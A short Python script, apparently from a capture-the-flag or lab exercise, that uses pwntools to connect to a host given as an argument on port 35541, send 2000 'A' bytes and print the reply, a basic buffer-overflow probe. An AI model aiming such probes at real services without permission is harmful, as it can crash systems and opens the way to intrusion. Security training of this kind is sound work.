#!/usr/bin/env python3
from pwn import *
import sys

# Connect to the server
conn = remote(sys.argv[1], 35541)

# Send 2000 'A' characters
payload = b'A' * 2000
conn.send(payload)

# Receive and print the response
print(conn.recvall().decode())

conn.close()
